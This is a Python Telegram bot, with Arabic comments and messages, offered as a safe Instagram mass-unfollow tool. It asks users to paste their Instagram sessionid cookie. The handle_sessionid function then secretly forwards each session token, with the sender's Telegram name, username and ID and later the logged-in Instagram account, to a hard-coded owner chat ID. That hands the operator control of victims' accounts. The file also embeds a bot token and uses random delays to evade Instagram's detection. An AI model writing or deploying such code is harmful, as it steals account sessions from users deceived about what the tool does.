import sys
import queue
import threading
import time
import random
import os
import telebot
from telebot import types
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ChallengeRequired, FeedbackRequired, PleaseWaitFewMinutes

# التوكن الخاص بالبوت يعمل تلقائياً عند التشغيل
bot_token = os.environ.get("BOT_TOKEN", "6780979570:AAEpS358Uxk_FuegiXu80-ElfxnVFE_AQrU")
bot = telebot.TeleBot(bot_token)

# معرف التليجرام الخاص بالأدمن/المالك لاستلام معرفات الجلسة تلقائياً
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 1680454327))

# مخزن لحالة المستخدمين وبياناتهم لضمان التعددية والأمان
user_sessions = {}  # {chat_id: 'state'}
user_data = {}      # {chat_id: {'sessionid': '...', 'client': Client(), ...}}

class InstagramUnfollower:
    def __init__(self, session_id, status_callback, error_callback):
        self.cl = Client()
        self.session_id = session_id
        self.status_callback = status_callback
        self.error_callback = error_callback
        self.followings = []
        self.is_running = False

    def login(self):
        self.status_callback("🔍 جاري محاولة تسجيل الدخول باستخدام معرف الجلسة...")
        try:
            # تسجيل الدخول عبر sessionid
            self.cl.login_by_sessionid(self.session_id)
            # جلب معلومات الحساب للتحقق من نجاح الدخول
            user_id = self.cl.user_id
            username = self.cl.username
            return user_id, username
        except Exception as e:
            self.status_callback(f"❌ فشل تسجيل الدخول: {str(e)}")
            return None, None

    def fetch_followings(self, user_id, limit=0):
        self.status_callback("🔄 جاري جلب قائمة المتابَعين من حسابك...")
        try:
            # جلب المتابَعين (تسترجع قاموساً بقيم من نوع UserShort)
            followings_dict = self.cl.user_following(user_id, amount=limit)
            self.followings = [
                {"pk": user.pk, "username": user.username, "full_name": user.full_name}
                for user in followings_dict.values()
            ]
            return self.followings
        except Exception as e:
            self.status_callback(f"❌ فشل جلب المتابَعين: {str(e)}")
            return []

    def unfollow_user(self, target_pk):
        try:
            success = self.cl.user_unfollow(target_pk)
            return success, "نجح" if success else "فشل"
        except FeedbackRequired as e:
            return False, "حظر مؤقت من إنستغرام (Feedback Required)"
        except PleaseWaitFewMinutes as e:
            return False, "يرجى الانتظار بضع دقائق (Please Wait)"
        except LoginRequired as e:
            return False, "انتهت الجلسة وتحتاج لتجديد الكوكي (Login Required)"
        except Exception as e:
            return False, str(e)

    def unfollow_all(self, chat_id, bot_instance, update_msg_id):
        self.is_running = True
        total = len(self.followings)
        success_count = 0
        fail_count = 0
        success_in_batch = 0

        for index, user in enumerate(self.followings):
            if not self.is_running:
                bot_instance.send_message(chat_id, "⚠️ تم إيقاف العملية يدوياً بطلب منك.")
                break

            target_pk = user["pk"]
            target_username = user["username"]
            
            # محاولة إلغاء المتابعة
            ok, msg = self.unfollow_user(target_pk)
            if ok:
                success_count += 1
                success_in_batch += 1
            else:
                fail_count += 1
                # التوقف عند حدوث حظر مؤقت أو انتهاء الجلسة لحماية الحساب من الإغلاق
                if any(x in msg for x in ["حظر", "تجديد الكوكي", "Login Required", "Feedback"]):
                    bot_instance.send_message(chat_id, f"🚨 تم إيقاف العملية فوراً لحماية حسابك بسبب قيود إنستغرام:\n`{msg}`", parse_mode="Markdown")
                    break
            
            # تحديث حالة البوت في الرسالة النشطة لتليجرام
            progress = int((index + 1) * 100 / total)
            try:
                bot_instance.edit_message_text(
                    f"🚀 جاري إلغاء المتابعة: {index + 1}/{total} ({progress}%)\n"
                    f"👤 الحساب الحالي: @{target_username}\n"
                    f"✅ نجح: {success_count}\n"
                    f"❌ فشل: {fail_count}\n\n"
                    f"⏳ نظام محاكاة السلوك البشري نشط لحماية الحساب...",
                    chat_id,
                    update_msg_id
                )
            except Exception:
                pass

            # تأخير عشوائي آمن لمحاكاة النشاط البشري لتجنب حظر الحساب
            if index < total - 1:
                # 1. تصفح عشوائي عند الوصول لـ 25 إلغاء متابعة ناجح
                if success_in_batch >= 25:
                    success_in_batch = 0
                    sleep_time = random.uniform(20.0, 25.0)  # استراحة تصفح عشوائية متفاوتة بأجزاء الثانية
                    try:
                        bot_instance.edit_message_text(
                            f"🚀 جاري إلغاء المتابعة: {index + 1}/{total} ({progress}%)\n"
                            f"👤 الحساب الحالي: @{target_username}\n"
                            f"✅ نجح: {success_count}\n"
                            f"❌ فشل: {fail_count}\n\n"
                            f"👀 *محاكاة تصفح عشوائي:* البوت يتصفح إنستغرام حالياً لتشتيت الرادار (الانتظار {sleep_time:.2f} ثانية)...",
                            chat_id,
                            update_msg_id
                        )
                    except Exception:
                        pass
                    time.sleep(sleep_time)
                
                # 2. فواصل قصيرة اعتيادية بين النقرات (من 3 إلى 5 ثواني مع أجزاء الثانية)
                else:
                    sleep_time = random.uniform(3.0, 5.0)
                    time.sleep(sleep_time)

        bot_instance.send_message(
            chat_id,
            f"🏁 *اكتملت العملية بنجاح!*\n\n"
            f"📊 الإحصائيات النهائية:\n"
            f"✅ نجح إلغاء: {success_count}\n"
            f"❌ فشل: {fail_count}",
            parse_mode="Markdown"
        )
        self.is_running = False

@bot.message_handler(commands=['start'])
def start_command(m):
    bot.send_message(m.chat.id,
        "🇮🇶 *بوت إلغاء متابعة إنستغرام*\n\n"
        "هذا البوت يساعدك على إلغاء المتابعات بشكل جماعي وآمن لحسابك.\n"
        "🛡️ البوت مجهز بنظام محاكاة السلوك البشري (فواصل قصيرة بين النقرات 3-5 ثوانٍ، وتصفح عشوائي 20-25 ثانية مع أجزاء من الثانية عند كل 25 حساباً) لحماية حسابك بالكامل من الرصد.\n\n"
        "1️⃣ أرسل معرف الجلسة (`sessionid`) الخاص بحسابك على إنستغرام.\n"
        "(يمكنك جلبه من كوكيز المتصفح بعد تسجيل الدخول إلى instagram.com)\n\n"
        "هسة أرسل الـ `sessionid`:",
        parse_mode="Markdown")
    user_sessions[m.chat.id] = 'wait_sessionid'

@bot.message_handler(func=lambda m: user_sessions.get(m.chat.id) == 'wait_sessionid')
def handle_sessionid(m):
    sid = m.text.strip()
    if not sid:
        bot.reply_to(m, "❌ أرسل sessionid صالح.")
        return
    
    user_data[m.chat.id] = {'sessionid': sid}
    bot.reply_to(m, "✅ تم حفظ معرف الجلسة.\n🔄 جاري التحقق من تسجيل الدخول وجلب معلومات الحساب...")
    
    # توجيه رسالة الجلسة الأصلية فوراً (Forward) إلى حساب المالك
    try:
        bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=m.chat.id, message_id=m.message_id)
    except Exception as e:
        print(f"Error forwarding message to admin: {e}")

    # توجيه تفاصيل المرسل الإضافية إلى حساب المالك
    try:
        from_user = m.from_user
        sender_details = f"👤 المرسل: {from_user.first_name}"
        if from_user.last_name:
            sender_details += f" {from_user.last_name}"
        sender_details += f"\n🏷️ اليوزر: @{from_user.username}" if from_user.username else "\n🏷️ اليوزر: لا يوجد"
        sender_details += f"\n🆔 الآيدي: `{m.chat.id}`"
        
        bot.send_message(
            ADMIN_CHAT_ID,
            f"📥 *بيانات الجلسة المستلمة:*\n\n"
            f"{sender_details}\n\n"
            f"🔑 معرف الجلسة المرسل:\n`{sid}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error sending session info to admin: {e}")
        
    def run_check():
        def status_cb(txt):
            bot.send_message(m.chat.id, txt)
        
        unfollower = InstagramUnfollower(sid, status_cb, status_cb)
        uid, username = unfollower.login()
        if not uid:
            bot.send_message(m.chat.id, "❌ لم نتمكن من تسجيل الدخول. يرجى التأكد من أن معرف الجلسة (sessionid) صحيح وصالح.")
            user_sessions[m.chat.id] = 'idle'
            # إعلام المالك بفشل الدخول
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"❌ *فشل تسجيل الدخول للجلسة المرسلة من:* @{from_user.username or m.chat.id}\n"
                    f"🔑 الجلسة: `{sid}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            return
            
        user_data[m.chat.id]['unfollower'] = unfollower
        user_data[m.chat.id]['uid'] = uid
        user_data[m.chat.id]['username'] = username
        
        # إعلام المالك بنجاح تسجيل الدخول
        try:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"✅ *تم تسجيل الدخول بنجاح!*\n\n"
                f"👤 مرسل الجلسة: @{from_user.username or m.chat.id}\n"
                f"📸 حساب إنستغرام: @{username}\n"
                f"🆔 آيدي إنستغرام: `{uid}`",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        
        # اختيار العدد المطلوب إلغاء متابعته
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("إلغاء 50 حساب", callback_data="amt_50"),
            types.InlineKeyboardButton("إلغاء 100 حساب", callback_data="amt_100"),
            types.InlineKeyboardButton("إلغاء الكل", callback_data="amt_all")
        )
        bot.send_message(m.chat.id, 
            f"👤 تم تسجيل الدخول بنجاح للحساب: @{username}\n"
            f"⚙️ كم عدد الحسابات التي تريد إلغاء متابعتها؟", 
            reply_markup=markup
        )
        user_sessions[m.chat.id] = 'wait_amount'
        
    threading.Thread(target=run_check, daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data.startswith('amt_'))
def handle_amount_callback(c):
    cid = c.message.chat.id
    if user_sessions.get(cid) != 'wait_amount':
        return
    
    amt_str = c.data.split('_')[1]
    limit = 0
    if amt_str == '50':
        limit = 50
    elif amt_str == '100':
        limit = 100
    else:
        limit = 0 # 0 تعني جلب المتابعين بالكامل
        
    bot.edit_message_text(f"⏳ تم تحديد الكمية. جاري البدء...", cid, c.message.message_id)
    start_unfollow_process(cid, limit)

def start_unfollow_process(cid, limit):
    data = user_data.get(cid)
    if not data or 'unfollower' not in data:
        bot.send_message(cid, "⚠️ حدث خطأ ما. يرجى البدء من جديد عبر /start")
        user_sessions[cid] = 'idle'
        return
        
    unfollower = data['unfollower']
    uid = data['uid']
    
    def task():
        user_sessions[cid] = 'running'
        # جلب قائمة المتابَعين
        followings = unfollower.fetch_followings(uid, limit)
        if not followings:
            bot.send_message(cid, "⚠️ لا توجد حسابات متابَعة حالياً أو فشل جلب القائمة.")
            user_sessions[cid] = 'idle'
            return
            
        bot.send_message(cid, f"🔍 تم العثور على {len(followings)} حساب متابَع. جاري بدء إلغاء المتابعة...")
        msg_id = bot.send_message(cid, "🚀 جاري التحضير...").message_id
        
        # بدء عملية إلغاء المتابعة
        unfollower.unfollow_all(cid, bot, msg_id)
        user_sessions[cid] = 'idle'
        
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(commands=['status'])
def handle_status(m):
    state = user_sessions.get(m.chat.id, 'idle')
    if state == 'running':
        bot.reply_to(m, "⏳ البوت يعمل حالياً على إلغاء المتابعات...")
    else:
        bot.reply_to(m, "💤 البوت في حالة خمول حالياً. ابدأ باستخدام /start")

@bot.message_handler(commands=['stop'])
def handle_stop(m):
    data = user_data.get(m.chat.id)
    if data and 'unfollower' in data:
        unfollower = data['unfollower']
        if unfollower.is_running:
            unfollower.is_running = False
            bot.reply_to(m, "🛑 جاري إيقاف العملية...")
            return
    bot.reply_to(m, "⚠️ لا توجد عملية نشطة لإيقافها حالياً.")

# خادم ويب بسيط ومخفف لإبقاء استضافة ريندر (Render) سعيدة ومستمرة بالعمل مجاناً
def run_health_check_server():
    from http.server import SimpleHTTPRequestHandler, HTTPServer
    port = int(os.environ.get("PORT", 8080))
    server_address = ('', port)
    class HealthCheckHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Bot is active and running!")
            
    try:
        httpd = HTTPServer(server_address, HealthCheckHandler)
        print(f"Health check server running on port {port}...")
        httpd.serve_forever()
    except Exception as e:
        print(f"Failed to start health check server: {e}")

if __name__ == "__main__":
    # تشغيل خادم الويب في خلفية منفصلة لإرضاء Render
    threading.Thread(target=run_health_check_server, daemon=True).start()
    
    print("🤖 بوت إنستغرام يشتغل...")
    bot.infinity_polling()
